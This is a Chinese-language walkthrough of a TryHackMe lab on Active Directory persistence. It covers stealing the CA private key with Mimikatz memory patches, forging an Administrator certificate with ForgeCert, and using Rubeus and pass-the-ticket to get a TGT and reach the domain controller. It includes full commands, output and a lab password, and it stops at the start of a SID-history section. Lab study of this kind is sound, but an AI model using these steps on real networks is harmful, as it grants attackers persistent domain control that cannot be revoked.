这里有一个快速说明。从现在开始讨论的技术具有令人难以置信的侵入性并且难以消除。即使您已批准红队练习来执行这些技术，您在执行这些技术时也必须格外小心。在现实场景中，利用大多数这些技术将导致完整的域重建。确保您完全了解使用这些技术的后果，并且仅在您的评估事先获得批准并且认为有必要时才执行这些技术。在大多数情况下，红队演习此时将被取消，而不是使用这些技术。这意味着您很可能不会执行这些持久性技术，而是模拟它们。 最后两种持久性技术依赖于凭据。虽然我们肯定可以让蓝队的生活变得复杂，但他们最终可以轮换足够的凭据来将我们踢出去。因此，虽然这些技术在让蓝队忙碌的同时保持着它们的忙碌很好，但我们应该寻找使用不依赖凭据的持久性技术，这意味着这些凭据的轮换不会将我们踢出去。我们将首先看看的是证书。 AD CS回归 在利用 AD 室中，我们利用证书成为域管理员。但是，证书也可用于持久性。我们所需要的只是一个可用于客户端身份验证的有效证书。这将允许我们使用证书来请求 TGT。这有什么美感？我们可以继续请求 TGT，无论他们在我们攻击的账户上进行了多少轮换。我们被踢出的唯一方法是他们撤销我们生成的证书或者证书过期。这意味着我们可能在接下来的大约 5 年里默认拥有持久访问权限。 如果您有兴趣了解有关请求证书并将其用于 Kerberos 身份验证的最新信息，请转到利用 AD 或 AD 证书模板室。然而，在这个房间里，我们并没有闲逛。我们正在追查证书颁发机构 (CA) 本身。 根据我们的访问权限，我们可以再进一步。我们可以简单地窃取根 CA 证书的私钥，以便在任何时候生成我们自己的证书。更糟糕的是，由于这些证书从未被 CA 颁发，因此蓝队无法撤销它们。对于蓝队来说，这将是更糟糕的情况，因为这意味着CA的轮换，这意味着蓝队必须撤销所有已经颁发的证书才能将我们踢出去。想象一下，你刚刚花了两天的时间执行了域接管，轮换了每个特权帐户的凭据，重置了所有的黄金和白银票据，只是为了意识到攻击者通过成为你的 CA 而持续存在。糟糕！ 提取私钥 CA的私钥存储在CA服务器本身上。如果私钥未通过基于硬件的保护方法（例如硬件安全模块 (HSM)）进行保护（对于仅将 Active Directory 证书服务 (AD CS) 用于内部目的的组织来说通常是这种情况），则它会受到机器数据保护 API (DPAPI)。这意味着我们可以使用 Mimikatz 和 SharpDPAPI 等工具来提取 CA 证书，从而从 CA 中提取私钥。 Mimikatz 是使用最简单的工具，但如果您想体验其他工具，请看看这里。使用任务 2 中的管理员凭据使用 SSH 对 THMDC.za.tryhackme.loc 进行身份验证，为您的用户创建一个唯一的目录，移至该目录并加载 Mimikatz： 我们先看看能否查看到DC上存储的证书： mimikatz # crypto::certificates /systemstore:local_machine * System Store : 'local_machine' (0x00020000) * Store : 'My' 0. Subject : Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 040000000000703a4d78090a0ab10400000010 Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 7:32:43 PM -&gt; 4/27/2023 7:32:43 PM Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39 Key Container : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Provider : Microsoft RSA SChannel Cryptographic Provider Provider type : RSA_SCHANNEL (12) Type : AT_KEYEXCHANGE (0x00000001) |Provider name : Microsoft RSA SChannel Cryptographic Provider |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f |Unique name : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 |Implementation: CRYPT_IMPL_SOFTWARE ; Algorithm : CALG_RSA_KEYX Key size : 2048 (0x00000800) Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) Exportable key : NO 1. za-THMDC-CA Subject : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 90e157dae304ef429824a33d3a3ef91e Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 6:58:15 PM -&gt; 4/27/2027 7:08:09 PM Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e Key Container : za-THMDC-CA Provider : Microsoft Software Key Storage Provider Provider type : cng (0) Type : CNG Key (0xffffffff) |Provider name : Microsoft Software Key Storage Provider |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ; Key Container : za-THMDC-CA Unique name : 8d666f3049de45dee20c70510f66d2cf_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Algorithm : RSA Key size : 2048 (0x00000800) Export policy : 00000003 ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; ) Exportable key : YES LSA isolation : NO 2. THMDC.za.tryhackme.loc Subject : CN=THMDC.za.tryhackme.loc Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 03000000000057c6f9be06e7c78d0300000010 Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 7:32:43 PM -&gt; 4/27/2023 7:32:43 PM Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42 Key Container : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Provider : Microsoft RSA SChannel Cryptographic Provider Provider type : RSA_SCHANNEL (12) Type : AT_KEYEXCHANGE (0x00000001) |Provider name : Microsoft RSA SChannel Cryptographic Provider |Key Container : te-DomainController-ccb1e691-6606-40a3-a87a-f549bdcd757c |Unique name : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 |Implementation: CRYPT_IMPL_SOFTWARE ; Algorithm : CALG_RSA_KEYX Key size : 2048 (0x00000800) Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) Exportable key : NO 3. Subject : Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 02000000000078856466521a82570200000010 Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 7:32:18 PM -&gt; 4/27/2023 7:32:18 PM Hash SHA1: 0d43237c50ccb446a07572545b5b4c8cf517682a Key Container : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Provider : Microsoft RSA SChannel Cryptographic Provider Provider type : RSA_SCHANNEL (12) Type : AT_KEYEXCHANGE (0x00000001) |Provider name : Microsoft RSA SChannel Cryptographic Provider |Key Container : te-KerberosAuthentication-21e4d1ee-54f7-4ca5-b36b-b2cecff9a609 |Unique name : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 |Implementation: CRYPT_IMPL_SOFTWARE ; Algorithm : CALG_RSA_KEYX Key size : 2048 (0x00000800) Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) Exportable key : NO 我们可以看到DC上有CA证书。我们还可以注意到，其中一些证书被设置为不允许我们导出密钥。如果没有这个私钥，我们将无法生成新的证书。幸运的是，Mimikatz 允许我们修补内存以使这些密钥可导出： mimikatz # privilege::debug Privilege '20' OK mimikatz # crypto::capi Local CryptoAPI RSA CSP patched Local CryptoAPI DSS CSP patched mimikatz # crypto::cng \"KeyIso\" service patched 如果您收到错误，请不要担心，这只是意味着其他人在您之前执行了该补丁。修补这些服务后，我们可以使用 Mimikatz 导出证书： mimikatz # crypto::certificates /systemstore:local_machine /export * System Store : 'local_machine' (0x00020000) * Store : 'My' 0. Subject : Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 040000000000703a4d78090a0ab10400000010 Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 7:32:43 PM -&gt; 4/27/2023 7:32:43 PM Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39 Key Container : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Provider : Microsoft RSA SChannel Cryptographic Provider Provider type : RSA_SCHANNEL (12) Type : AT_KEYEXCHANGE (0x00000001) |Provider name : Microsoft RSA SChannel Cryptographic Provider |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f |Unique name : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 |Implementation: CRYPT_IMPL_SOFTWARE ; Algorithm : CALG_RSA_KEYX Key size : 2048 (0x00000800) Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) Exportable key : NO Public export : OK - 'local_machine_My_0_.der' Private export : OK - 'local_machine_My_0_.pfx' 1. za-THMDC-CA Subject : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 90e157dae304ef429824a33d3a3ef91e Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 6:58:15 PM -&gt; 4/27/2027 7:08:09 PM Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e Key Container : za-THMDC-CA Provider : Microsoft Software Key Storage Provider Provider type : cng (0) Type : CNG Key (0xffffffff) |Provider name : Microsoft Software Key Storage Provider |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ; Key Container : za-THMDC-CA Unique name : 8d666f3049de45dee20c70510f66d2cf_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Algorithm : RSA Key size : 2048 (0x00000800) Export policy : 00000003 ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; ) Exportable key : YES LSA isolation : NO Public export : OK - 'local_machine_My_1_za-THMDC-CA.der' Private export : OK - 'local_machine_My_1_za-THMDC-CA.pfx' 2. THMDC.za.tryhackme.loc Subject : CN=THMDC.za.tryhackme.loc Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 03000000000057c6f9be06e7c78d0300000010 Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 7:32:43 PM -&gt; 4/27/2023 7:32:43 PM Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42 Key Container : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Provider : Microsoft RSA SChannel Cryptographic Provider Provider type : RSA_SCHANNEL (12) Type : AT_KEYEXCHANGE (0x00000001) |Provider name : Microsoft RSA SChannel Cryptographic Provider |Key Container : te-DomainController-ccb1e691-6606-40a3-a87a-f549bdcd757c |Unique name : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 |Implementation: CRYPT_IMPL_SOFTWARE ; Algorithm : CALG_RSA_KEYX Key size : 2048 (0x00000800) Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) Exportable key : NO Public export : OK - 'local_machine_My_2_THMDC.za.tryhackme.loc.der' Private export : OK - 'local_machine_My_2_THMDC.za.tryhackme.loc.pfx' 3. Subject : Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 02000000000078856466521a82570200000010 Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 7:32:18 PM -&gt; 4/27/2023 7:32:18 PM Hash SHA1: 0d43237c50ccb446a07572545b5b4c8cf517682a Key Container : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Provider : Microsoft RSA SChannel Cryptographic Provider Provider type : RSA_SCHANNEL (12) Type : AT_KEYEXCHANGE (0x00000001) |Provider name : Microsoft RSA SChannel Cryptographic Provider |Key Container : te-KerberosAuthentication-21e4d1ee-54f7-4ca5-b36b-b2cecff9a609 |Unique name : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 |Implementation: CRYPT_IMPL_SOFTWARE ; Algorithm : CALG_RSA_KEYX Key size : 2048 (0x00000800) Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) Exportable key : NO Public export : OK - 'local_machine_My_3_.der' Private export : OK - 'local_machine_My_3_.pfx' 导出的证书将以 PFX 和 DER 格式存储到磁盘： za-THMDC-CA.pfx 证书是我们特别感兴趣的证书。为了导出私钥，必须使用密码来加密证书。默认情况下，Mimikatz 分配的密码为 mimikatz 。使用 SCP 下载或复制此证书到您的 AttackBox，然后将其复制到 THMWRK1 上的低权限用户的主目录。如果您愿意，还可以在自己的未加入域的 Windows 计算机上执行其余步骤。 这里我不知为何我没有za-THMDC-CA.pfx证书，弄了半天是我ssh连接对象搞错了 生成我们自己的证书 现在我们有了私钥和根 CA 证书，我们可以使用 SpectorOps ForgeCert 工具为我们想要的任何用户伪造客户端身份验证证书。 ForgeCert 和 Rubeus 二进制文件存储在 THMWRK1 上的 C:\\Tools\\ 目录中。让我们使用 ForgeCert 生成一个新证书： 这里我们需要将上述的pfx文件传输到我们的attackbox上 scp Administrator@thmdc.za.tryhackme.loc:C:/Users/Administrator/hybcx/local_machine_My_1_za-THMDC-CA.pfx . 接着ssh连接该域环境的thmwrk计算机，将该pfx文件传输至该计算机上 certutil -urlcache -f http://10.50.59.120:8000/za-THMDC-CA.pfx za-THMDC-CA.pfx 接下来使用工具生成证书 C:\\Tools\\ForgeCert\\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath hybcx.pfx --NewCertPassword Password123 参数解释： CaCertPath - 我们导出的 CA 证书的路径。 CaCertPassword - 用于加密证书的密码。默认情况下，Mimikatz 分配的密码为 mimikatz 。 Subject - 证书的主题或通用名称。对于我们使用证书的用途而言，这并不重要。 subjectAltName - 这是我们要使用此证书模拟的帐户的用户主体名称 (UPN)。它必须是合法用户。 NewCertPath - ForgeCert 将存储生成的证书的路径。 NewCertPassword - 由于证书需要导出私钥用于身份验证，因此我们必须设置一个用于加密它的新密码。 我们可以使用 Rubeus 来使用证书请求 TGT，以验证证书是否可信。我们将使用以下命令： C:\\Tools\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:hybcx.pfx /password:Password123 /outfile:fullAdmin.kirbi /domain:za.tryhackme.loc /dc:10.200.62.101 我们来分解一下参数： /user - 这指定我们将模拟的用户，并且必须与我们生成的证书的 UPN 相匹配 /enctype - 指定票证的加密类型。设置此项对于规避很重要，因为默认加密算法很弱，这会导致溢出警报 /certificate - 我们生成的证书的路径 /password - 我们的证书文件的密码 /outfile - TGT 将输出到的文件 /domain - 我们当前攻击的域的 FQDN /dc - 我们请求 TGT 的域控制器的 IP。通常，最好选择运行CA服务的DC 执行命令后，我们应该会收到 TGT： 但这里我总是报错，如下图 这里经过几篇文章的搜寻，该报错原因是由于其不支持padata类型，也就是该KDC没有设置kerberos身份验证。这里也是懵逼了，尝试几次都失败，感觉是环境问题，但刚重置了还是出错，不理解，就先放出成果图 za\\aaron.jones@THMWRK1 C:\\Users\\aaron.jones&gt;C:\\Tools\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101 ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.0 [*] Action: Ask TGT [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert [*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\\Administrator' [+] TGT request successful! [*] base64(ticket.kirbi): doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC BJaqEcIY2IcGQKFNgPbDVY0ZXsEdeJAmAL2ARoESt1XvdKC5Y94GECr+FoxztaW2DVmTpou8g116F6mZ nSHYrZXEJc5Z84qMGEzEpa38zLGEdSyqIFL9/avtTHqBeqpR4kzY2B/ekqhkUvdb5jqapIK4MkKMd4D/ MHLr5jqTv6Ze2nwTMAcImRpxE5HSxFKO7efZcz2glEk2mQptLtUq+kdFEhDozHMAuF/wAvCXiQEO8NkD zeyabnPAtE3Vca6vfmzVTJnLUKMIuYOi+7DgDHgBVbuXqorphZNl4L6o5NmviXNMYazDybaxKRvzwrSr 2Ud1MYmJcIsL3DMBa4bxR57Eb5FhOVD29xM+X+lswtWhUO9mUrVyEuHtfV7DUxA94OvX1QmCcas4LXQW ggOit/DCJdeyE8JjikZcR1yL4u7g+vwD+SLkusCZE08XDj6lopupt2Hl8j2QLR2ImOJjq54scOllW4lM Qek4yqKwP6p0oo4ICxusM8cPwPUxVcYdTCh+BczRTbpoKiFnI+0qOZDtgaJZ/neRdRktYhTsGL39VHB5 i+kOk3CkcstLfdAP1ck4O+NywDMUK+PhGJM/7ykFe2zICIMaGYGnUDRrad3z8dpQWGPyTBgTvemwS3wW NuPbQFFaoyiDiJyXPh+VqivhTUX9st80ZJZWzpE7P1pTNPGq38/6NyLjiE9srbOt6hCLzUaOSMGH1Enf SYmNljeW2R0gsFWBaFt16AHfT9G9Et2nOCJn/D/OFePFyR4uJF44p82CmVlBhzOxnCaGtQM2v9lwBqQF CcVLjxGXqKrPUr1RUGthP861jhMoXD4jBJ/Q32CkgVdlJRMweqcIfNqP/4mEjbUN5qjNqejYdUb/b5xw S794AkaKHcLFvukd41VTm87VvDOp6mM5lID/PLtTCPUZ0zrEb01SNiCdB5IAfnV23vmqsOocis4uZklG CNdI1/lsICpS/jaK6NM/0oKehMg+h4VAFLx4HnTSY4ugbrkdxU948qxPEfok/P6umEuny7yTDQFoCUKk RuLXbtwwplYTGBDLfzwhcNX8kc/GGLbH9+B8zRXxhd3TGQ7ZT03r798AjobKx024ozt6g4gjS5k/yIT+ f29XrPzc+UODunO2Qv8JM5NAE3L6ryHp/DdgTaXGBRccgQBeQERNz6wxkdVK6SB7juOjU5JoZ5ZfmTuO hQ5hnboH1GvMy4+zeU2P7foWEJE76i9uZMbjUilbWRERYUL/ZjjXQBVWBaxoAdFIoawAzSXUZniNavnS n22qqgbd79Zj+lRavAb7Wlk5Gul4G6LMkh2MIJ4JOnrV0JV1yOhoqZ5V6KX/2r7ecyrVZIf2Qf0+ci9G vboJiLvWKgXkx7VaKbcLhO743BNYyq57nPNvWhVt3jbFmEq4nTdNou6hQHG4O5hVMhBKGgTwYz3yFPOP iuxroniQawSUJbmwObxVeoculPhxEJ69MSgKROTXrKrQAJ84D5QJHQYZus6w+LtodZn1//ZLhgILeFsY 5K6d4ot2eqEr/A4Vu+wFjGjw87FTvHVcf8HdtGhqkawtPOrzo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3 NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ= ServiceName : krbtgt/za.tryhackme.loc ServiceRealm : za.tryhackme.loc UserName : Administrator UserRealm : za.tryhackme.loc StartTime : 2/6/2022 5:54:46 PM EndTime : 2/7/2022 3:54:46 AM RenewTill : 2/13/2022 5:54:46 PM Flags : name_canonicalize, pre_authent, initial, renewable, forwardable KeyType : aes256_cts_hmac_sha1 Base64(key) : Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU= ASREP (key) : BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED 现在我们可以使用 Mimikatz 加载 TGT 并向 THMDC 进行身份验证： C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe mimikatz # kerberos::ptt administrator.kirbi dir \\\\THMDC.za.tryhackme.loc\\c$\\ mimikatz # kerberos::ptt administrator.kirbi * File: 'administrator.kirbi': OK mimikatz # exit Bye! za\\aaron.jones@THMWRK1 C:\\Users\\aaron.jones&gt;dir \\\\THMDC.za.tryhackme.loc\\c$\\ Volume in drive \\\\THMDC.za.tryhackme.loc\\c$ is Windows Volume Serial Number is 1634-22A9 Directory of \\\\THMDC.za.tryhackme.loc\\c$ 01/04/2022 08:47 AM 103 delete-vagrant-user.ps1 04/30/2022 10:24 AM 154 dns_entries.csv 04/27/2022 10:53 PM 885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin 09/15/2018 08:19 AM &lt;DIR&gt; PerfLogs 03/21/2020 09:31 PM &lt;DIR&gt; Program Files 03/21/2020 09:28 PM &lt;DIR&gt; Program Files (x86) 04/27/2022 08:27 AM 1,423 thm-network-setup-dc.ps1 04/25/2022 07:13 PM &lt;DIR&gt; tmp 04/27/2022 08:22 AM &lt;DIR&gt; Users 04/25/2022 07:11 PM &lt;SYMLINKD&gt; vagrant [\\\\vboxsvr\\vagrant] 04/27/2022 08:12 PM &lt;DIR&gt; Windows 7 File(s) 2,356,811 bytes 7 Dir(s) 50,914,541,568 bytes free 我们不再是蓝队的朋友 证书持久性的防御难度要大得多。即使您轮换受感染帐户的凭据，证书仍然有效。消除持久性的唯一方法是吊销证书。但是，只有当我们通过合法渠道生成证书时，这才可能实现。由于我们导出了 CA 并自己生成了证书，因此它不会出现在 AD CS 的已颁发证书列表中，这意味着蓝队将无法撤销我们的证书。 那么消除持久性的唯一解决方案是什么？好吧，这就是为什么我们不再是朋友了。他们必须吊销根 CA 证书。但是吊销这个证书意味着AD CS颁发的所有证书都会突然失效。这意味着他们必须为每个使用 AD CS 的系统生成新证书。您应该开始明白为什么这种类型的持久性非常危险，并且如果执行则需要完全重建系统。 这里又找了几篇文章找到了解决办法，就是rdp连接目标服务器更改一下配置 xfreerdp /d:za.tryhackme.loc /u:'Administrator' /p:'tryhackmewouldnotguess1@' /v:THMDC.za.tryhackme.loc /cert:ignore +clipboard #使用run弹窗，执行gpedit.msc(或者在win搜索栏中搜索gpedit) #编辑组策略-&gt;计算机配置-&gt;windows设置-&gt;安全设置-&gt;本地策略-&gt;安全选项-&gt;配置Kerberos允许的加密类型(右键编辑属性，勾选需要的加密类型选项并确定即可) #编辑组策略-&gt;计算机配置-&gt;管理模版-&gt;系统-&gt;KDC-&gt;将KDC support for PKInit Freshness Extension设定为Enable #通过RDP界面重启DC并退出rdp界面，然后继续在我们使用低权限AD用户所访问的THMWRK1跳板主机上进行操作。 za\\pauline.hargreaves@THMWRK1 C:\\Users\\pauline.hargreaves&gt;C:\\Tools\\Rubeus.exe asktgt /u ser:Administrator /enctype:aes256 /certificate:hybcx.pfx /password:Password123 /outfile :fullAdmin.kirbi /domain:za.tryhackme.loc /dc:10.200.62.101 ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.0 [*] Action: Ask TGT [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=User [*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\\Administrator' [+] TGT request successful! [*] base64(ticket.kirbi): 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 [*] Ticket written to fullAdmin.kirbi ServiceName : krbtgt/za.tryhackme.loc ServiceRealm : ZA.TRYHACKME.LOC UserName : Administrator UserRealm : ZA.TRYHACKME.LOC StartTime : 2/29/2024 11:39:20 AM EndTime : 2/29/2024 9:39:20 PM RenewTill : 3/7/2024 11:39:20 AM Flags : name_canonicalize, pre_authent, initial, renewable, forwa rdable KeyType : aes256_cts_hmac_sha1 Base64(key) : d7iXvd7xTz/ZXRGvP+Iof3piKRTjXgaamnmziQZXYVo= ASREP (key) : B99608280DACD112BC2886CA0DFAF854C1DD09EDA0D5143A94ABE96E9 01580EE 之后再次尝试终于成功 za\\pauline.hargreaves@THMWRK1 C:\\Users\\pauline.hargreaves&gt;dir \\\\THMDC.za.tryhackme.loc\\ c$\\ Volume in drive \\\\THMDC.za.tryhackme.loc\\c$ is Windows Volume Serial Number is 1634-22A9 Directory of \\\\THMDC.za.tryhackme.loc\\c$ 01/04/2022 07:47 AM 103 delete-vagrant-user.ps1 05/01/2022 08:11 AM 169 dns_entries.csv 09/15/2018 07:19 AM PerfLogs 05/11/2022 09:32 AM Program Files 03/21/2020 08:28 PM Program Files (x86) 07/03/2022 05:05 PM 7,168 shell.exe 05/01/2022 08:17 AM 1,725 thm-network-setup-dc.ps1 07/06/2022 03:38 PM tmp 06/30/2022 01:58 PM Tools 02/29/2024 11:15 AM Users 04/25/2022 06:11 PM vagrant [\\\\vboxsvr\\vagrant] 07/03/2022 08:51 AM Windows 4 File(s) 9,165 bytes 8 Dir(s) 51,454,889,984 bytes free 0x05 通过 SID 历史记录进行持久化 安全标识符 (SID) 之前已讨论过。但回顾一下，SID 用于在连接到资源时跟踪安全主体和帐户的访问权限。然而，帐户有一个有趣的属性，称为 SID 历史记录。 SID 